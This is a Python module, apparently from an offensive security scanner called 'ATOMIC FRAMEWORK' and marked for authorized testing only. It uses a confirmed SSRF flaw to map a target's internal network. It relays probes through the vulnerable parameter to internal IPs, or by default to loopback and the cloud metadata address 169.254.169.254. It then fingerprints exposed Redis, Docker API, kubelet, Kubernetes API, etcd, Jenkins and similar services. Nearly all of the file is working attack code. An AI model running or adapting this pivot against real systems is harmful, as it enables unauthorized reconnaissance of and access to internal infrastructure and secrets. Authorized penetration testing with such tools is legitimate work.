#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK — Internal Segment Mapper

⚠️ FOR AUTHORIZED TESTING ONLY ⚠️

Given a confirmed SSRF (a finding of vuln_type="ssrf" already emitted
by modules/ssrf.py or modules/advanced_weapon.py), map the internal
network segment the target sits in — WITHOUT running an active port
scan of arbitrary internal IPs.

The check is deliberately narrow:
    * Only probes ports on the SAME internal IPs the SSRF already
      demonstrated reachability to (i.e. IPs seen in prior findings).
    * Only probes a small allowlist of common internal-service ports
      + protocols (redis, mysql, postgres, mongo, elasticsearch,
      memcached, docker, consul, nomad, etcd, kubelet, k8s-api,
      prometheus, kibana, jenkins).
    * Uses service-specific fingerprint requests (e.g. `INFO\r\n` to
      Redis, `HELP\r\n` to memcached) via the SSRF gateway, so each
      hit is a confirmed service — not a port that "answered."

The result is a segment map of confirmed internal services accessible
through the same authorization boundary the SSRF broke.
"""
from __future__ import annotations

import re
from typing import Any, Optional
from urllib.parse import urlparse

from modules.base import BaseModule

# (label, port, probe_url_template, response_marker)
# probe_url_template uses {ip} placeholder; markers are case-insensitive
# substrings that must appear in the response body for a confirmed hit.
_SERVICE_PROBES: list[tuple[str, int, str, tuple[str, ...]]] = [
    ("redis",         6379, "http://{ip}:6379/",                          ("noauth", "invalid multibulk", "redis_version")),
    ("memcached",    11211, "http://{ip}:11211/",                         ("VERSION",)),
    ("mysql",         3306, "http://{ip}:3306/",                          ("mysql_native_password", "Host '.*' is not allowed")),
    ("postgres",      5432, "http://{ip}:5432/",                          ("PGRES", "PostgreSQL", "no PostgreSQL user")),
    ("mongodb",      27017, "http://{ip}:27017/",                         ("It looks like you are trying", "mongodb", "isdbgrid")),
    ("elasticsearch", 9200, "http://{ip}:9200/",                          ('"tagline"', "You Know, for Search")),
    ("docker",        2375, "http://{ip}:2375/version",                   ("ApiVersion", "\"Version\"")),
    ("consul",        8500, "http://{ip}:8500/v1/agent/self",             ("Config", "NodeName")),
    ("nomad",         4646, "http://{ip}:4646/v1/agent/self",             ("member", "config")),
    ("etcd",          2379, "http://{ip}:2379/version",                   ("etcdserver", "etcdcluster")),
    ("kubelet",      10250, "http://{ip}:10250/pods",                     ("kind", "PodList")),
    ("k8s-api",       6443, "http://{ip}:6443/api/v1/namespaces",         ("APIVersion", "kind")),
    ("prometheus",    9090, "http://{ip}:9090/api/v1/status/config",      ("prometheus", "scrape_configs")),
    ("kibana",        5601, "http://{ip}:5601/api/status",                ("kibana", "\"level\"")),
    ("jenkins",       8080, "http://{ip}:8080/api/json",                  ("jenkins", "_class")),
    ("rabbitmq",     15672, "http://{ip}:15672/api/overview",             ("rabbitmq_version",)),
]

# Extract IPv4 addresses out of prior SSRF evidence bodies.
_IP_RE = re.compile(r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b")
# Fallback candidates when no IP is observed — the loopback + IMDS.
_DEFAULT_CANDIDATES = ("127.0.0.1", "169.254.169.254")


class InternalSegmentMapModule(BaseModule):
    """Map the internal segment reachable through a confirmed SSRF."""

    name = "Internal Segment Map"
    vuln_type = "internal_segment"

    def __init__(self, engine):
        super().__init__(engine)
        # Cap the number of (ip, port) probes per scan to keep the
        # network footprint tight. Default 96 = 6 IPs × 16 services.
        self.max_probes: int = int(self.config.get("segment_max_probes", 96) or 96)
        self._probed: set[tuple[str, int]] = set()

    # ------------------------------------------------------------------ #
    # BaseModule contract
    # ------------------------------------------------------------------ #

    def test(self, url: str, method: str, param: str, value: str) -> None:
        pass  # Per-target only.

    def test_url(self, url: str) -> None:
        ssrf_findings = self._collect_ssrf_findings()
        if not ssrf_findings:
            return

        # Find a parameter on `url` we can pipe the segment probes
        # through — reuse the SSRF-vulnerable one.
        ssrf_source = self._pick_ssrf_source(url, ssrf_findings)
        if ssrf_source is None:
            return
        ssrf_url, ssrf_method, ssrf_param = ssrf_source

        # Collect candidate internal IPs from SSRF evidence bodies.
        candidates = self._collect_candidate_ips(ssrf_findings)
        if not candidates:
            candidates = list(_DEFAULT_CANDIDATES)

        probes = 0
        for ip in candidates:
            for label, port, probe_tmpl, markers in _SERVICE_PROBES:
                if probes >= self.max_probes:
                    return
                key = (ip, port)
                if key in self._probed:
                    continue
                self._probed.add(key)
                probes += 1

                target_url = probe_tmpl.format(ip=ip)
                resp = self._send_ssrf(ssrf_url, ssrf_method, ssrf_param, target_url)
                if resp is None:
                    continue
                body = (getattr(resp, "text", "") or "")[:2048]
                hit = [m for m in markers if m.lower() in body.lower()]
                if hit:
                    self._emit_signal(
                        vuln_type="internal_segment",
                        technique=f"Internal service confirmed via SSRF: {label} on {ip}:{port}",
                        url=target_url,
                        method="GET",
                        param=ssrf_param,
                        payload=target_url,
                        evidence_text=(
                            f"SSRF gateway {ssrf_url!r} relayed to {target_url!r}; "
                            f"markers matched: {', '.join(hit)}. Segment surface confirmed."
                        ),
                        raw_confidence=0.90,
                    )

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _collect_ssrf_findings(self) -> list[Any]:
        return [
            f for f in list(getattr(self.engine, "findings", []) or [])
            if _get(f, "vuln_type") == "ssrf"
        ]

    def _pick_ssrf_source(
        self, url: str, ssrf_findings: list[Any]
    ) -> Optional[tuple[str, str, str]]:
        """Return (ssrf_url, method, param) whose host matches `url`."""
        host = urlparse(url).netloc
        for f in ssrf_findings:
            fu = _get(f, "url") or ""
            fp = _get(f, "param")
            fm = _get(f, "method") or "GET"
            if fp and urlparse(fu).netloc == host:
                return fu, fm, fp
        # Fallback: the first SSRF finding regardless of host.
        for f in ssrf_findings:
            fp = _get(f, "param")
            if fp:
                return _get(f, "url") or "", _get(f, "method") or "GET", fp
        return None

    def _collect_candidate_ips(self, findings: list[Any]) -> list[str]:
        seen: list[str] = []
        for f in findings:
            text = _get(f, "evidence_text") or ""
            for m in _IP_RE.findall(text):
                if m not in seen:
                    seen.append(m)
        return seen

    def _send_ssrf(self, url: str, method: str, param: str, target_url: str):
        try:
            method = (method or "GET").upper()
            if method == "GET":
                from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
                p = urlparse(url)
                qs = dict(parse_qsl(p.query, keep_blank_values=True))
                qs[param] = target_url
                return self.requester.request(
                    urlunparse(p._replace(query=urlencode(qs))), "GET", timeout=6,
                )
            return self.requester.request(url, method, data={param: target_url}, timeout=6)
        except Exception:
            return None


def _get(o: Any, name: str) -> Any:
    if isinstance(o, dict):
        return o.get(name)
    return getattr(o, name, None)
